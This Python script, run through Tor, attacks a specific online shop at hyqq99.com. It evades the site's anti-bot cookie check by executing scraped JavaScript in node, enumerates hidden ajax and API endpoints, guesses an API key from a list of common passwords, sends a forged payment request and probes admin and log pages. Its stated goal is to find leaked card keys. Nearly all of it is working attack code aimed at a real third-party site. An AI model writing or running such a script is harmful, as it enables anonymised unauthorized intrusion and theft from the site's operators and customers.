#!/usr/bin/env python3
"""Tor-based Rainbow SUCCESS_CASES for hyqq99.com/shop (requests + socks5)."""
import re
import json
import subprocess
import urllib.parse
from pathlib import Path

import requests

OUT = Path("/data/recon/hyqq99.com")
BASE = "https://hyqq99.com/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}


def log(*a):
    print(*a, flush=True)


def main():
    s = requests.Session()
    s.proxies.update(PROXIES)
    s.headers.update({"User-Agent": UA, "Accept-Language": "zh-CN,zh;q=0.9"})
    s.verify = False
    requests.packages.urllib3.disable_warnings()

    results = {"target": BASE + "/", "via": "tor", "cases": {}, "kami_found": False}

    def get(url, **kw):
        kw.setdefault("timeout", 30)
        try:
            r = s.get(url, **kw)
            return r.status_code, r.text, r.content
        except Exception as e:
            return None, str(e), b""

    def post(url, data=None, **kw):
        kw.setdefault("timeout", 30)
        try:
            r = s.post(url, data=data, **kw)
            return r.status_code, r.text, r.content
        except Exception as e:
            return None, str(e), b""

    log("home via tor...")
    code, text, raw = get(BASE + "/", timeout=45)
    log("home", code, len(raw or b""), (text or "")[:80].replace("\n", " "))

    if text and "sec_defend" in text and "mod=buy" not in text and "mod=query" not in text:
        m = re.search(
            r"setCookie\(\s*[\"']sec_defend[\"']\s*,\s*(.+?)\)\s*;\s*setCookie\(\s*[\"']sec_defend_time[\"']",
            text,
            re.S,
        )
        if not m:
            m = re.search(r"setCookie\('sec_defend',(.+?)\)", text, re.S)
        if m:
            val = subprocess.run(
                ["node", "-e", f"console.log({m.group(1)})"],
                capture_output=True,
                text=True,
                timeout=15,
            ).stdout.strip()
            log("waf", val[:48])
            s.cookies.set("sec_defend", val, domain="hyqq99.com", path="/")
            s.cookies.set("sec_defend_time", "2", domain="hyqq99.com", path="/")
            code, text, raw = get(BASE + "/index.php", timeout=45)
            log("after waf", code, len(raw or b""), (re.search(r"<title>([^<]+)", text or "") or [None, "?"])[1])
        else:
            (OUT / "probe" / "tor_waf.html").write_text(text, encoding="utf-8")
            log("no waf expr")

    cached = OUT / "probe" / "https_hyqq99.com_shop_.html"
    if (not text or len(text) < 5000) and cached.exists():
        home_for_enum = cached.read_text("utf-8", "ignore")
        log("enum from cache", len(home_for_enum))
    else:
        home_for_enum = text or ""
        (OUT / "probe" / "tor_home.html").write_text(home_for_enum, encoding="utf-8")

    results["title"] = (re.search(r"<title>([^<]+)", home_for_enum) or [None, None])[1]
    results["contacts"] = {
        "tg": sorted(set(re.findall(r"@hysc\w+|t\.me/[\w]+", home_for_enum)))[:20]
    }
    log("TITLE", results["title"], results["contacts"])

    code, text, _ = get(BASE + "/ajax.php?act=getcount", headers={"X-Requested-With": "XMLHttpRequest"})
    log("GETCOUNT", code, text)
    results["getcount"] = text
    try:
        results["getcount_json"] = json.loads(text)
    except Exception:
        pass

    aq = []
    for qs in ["act=query&page=1", "act=query&page=1&limit=50", "act=query&page=2"]:
        code, text, _ = get(BASE + "/ajax.php?" + qs, headers={"X-Requested-With": "XMLHttpRequest"})
        log("AJAX", qs, code, (text or "")[:220])
        aq.append({"qs": qs, "code": code, "body": (text or "")[:500]})
    code, text, _ = post(
        BASE + "/ajax.php?act=query",
        data={"page": "1", "limit": "100"},
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    log("AJAXPOST", code, (text or "")[:220])
    aq.append({"post": True, "code": code, "body": (text or "")[:500]})
    results["cases"]["ajax_query"] = aq

    qd = []
    for data in ["1", "test", "12649", "20260801", "@hysc99"]:
        code, text, _ = get(BASE + f"/?mod=query&data={urllib.parse.quote(data)}", timeout=40)
        hits = []
        for pat in [r"卡密[^<]{0,100}", r"showOrder", r"mod=faka", r"没有查询到", r"查询结果", r"订单号[^<]{0,40}"]:
            m = re.search(pat, text or "", re.I)
            if m:
                hits.append(m.group(0)[:100])
        log("QD93", data, "len", len(text or ""), hits[:6])
        qd.append({"data": data, "len": len(text or ""), "hits": hits, "code": code})
        if text and len(text) > 500:
            (OUT / "probe" / f"tor_qd93_{data.replace('@','')}.html").write_text(text, encoding="utf-8")
    results["cases"]["qd93"] = qd

    api = []
    for qs in [
        "act=search&id=1",
        "act=search&id=100",
        "act=search&id=1000",
        "act=search&id=12649",
        "act=tools&key=",
        "act=tools&key=123456&limit=1",
        "act=tools&key=hysc99&limit=1",
        "act=tools&key=hyqq99&limit=1",
        "act=tools&key=admin&limit=1",
        "act=site",
        "act=goodslist",
        "act=classlist",
    ]:
        code, text, _ = get(BASE + f"/%61pi.php?{qs}", timeout=25)
        log("API61", qs, code, (text or "")[:200])
        api.append({"qs": qs, "code": code, "body": (text or "")[:400]})
    results["cases"]["api61"] = api

    tools = []
    for key in ["", "1", "123456", "admin", "hysc99", "hyqq99", "haiyang", "ocean99", "admin888", "888888"]:
        code, text, _ = get(BASE + f"/%61pi.php?act=tools&key={urllib.parse.quote(key)}&limit=1", timeout=20)
        hit = bool(text) and all(x not in text for x in ["空", "错误", "不正确", "关闭", "登录", "403"])
        tools.append({"key": key, "body": (text or "")[:220], "interesting": hit})
        if hit or key in ("", "123456", "hysc99"):
            log("TOOLS", repr(key), (text or "")[:200], "HIT" if hit else "")
    results["cases"]["tools"] = tools

    tids = sorted(set(re.findall(r"[?&]tid=(\d+)", home_for_enum)), key=int)
    cids = sorted(set(re.findall(r"[?&]cid=(\d+)", home_for_enum)), key=int)
    results["tids"] = tids[:80]
    results["cids"] = cids
    log("TIDS", len(tids), tids[:30], "CIDS", cids[:20])

    goods = []
    for tid in (tids[:5] or ["1", "8", "10"]):
        code, text, _ = get(BASE + f"/?mod=buy&tid={tid}", timeout=40)
        info = {
            "tid": tid,
            "code": code,
            "len": len(text or ""),
            "title": (re.search(r"<title>([^<]+)", text or "") or [None, None])[1],
            "prices": re.findall(r"([\d]+\.[\d]{2})", text or "")[:6],
            "hashsalt": "hashsalt" in (text or ""),
        }
        goods.append(info)
        log("GOODS", info)
        if text and len(text) > 500:
            (OUT / "probe" / f"tor_buy_{tid}.html").write_text(text, encoding="utf-8")
    results["goods"] = goods

    for g in goods:
        if not g.get("hashsalt"):
            continue
        tid = g["tid"]
        code, text, _ = get(BASE + f"/?mod=buy&tid={tid}", timeout=40)
        hm = re.search(r"var hashsalt=(.+?);", text or "")
        hs = ""
        if hm:
            hs = subprocess.run(
                ["node", "-e", f"console.log({hm.group(1)})"],
                capture_output=True,
                text=True,
                timeout=10,
            ).stdout.strip()
        code, text, _ = post(
            BASE + "/ajax.php?act=pay",
            data={"tid": tid, "inputvalue": "13800138000", "num": "1", "hashsalt": hs},
            headers={"X-Requested-With": "XMLHttpRequest"},
        )
        log("PAY", tid, code, (text or "")[:300])
        results["pay"] = {"tid": tid, "body": (text or "")[:400], "hashsalt": bool(hs)}
        break

    for path in ["/cron.php", "/toollogs.php", "/user/login.php"]:
        code, text, _ = get(BASE + path, timeout=20)
        log("EXTRA", path, code, (text or "")[:160].replace("\n", " "))
        results.setdefault("extras", {})[path] = {"code": code, "body": (text or "")[:250]}

    blob = json.dumps(results, ensure_ascii=False)
    results["kami_found"] = bool(re.search(r"(卡密|kami)[:：\s\"'][^\"']{6,}", blob, re.I))
    for item in results["cases"].get("ajax_query", []):
        if '"data":[{' in (item.get("body") or "") or "卡密" in (item.get("body") or ""):
            results["kami_found"] = True

    (OUT / "dump" / "STATS.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("KAMI", results["kami_found"])
    log("DONE")


if __name__ == "__main__":
    main()
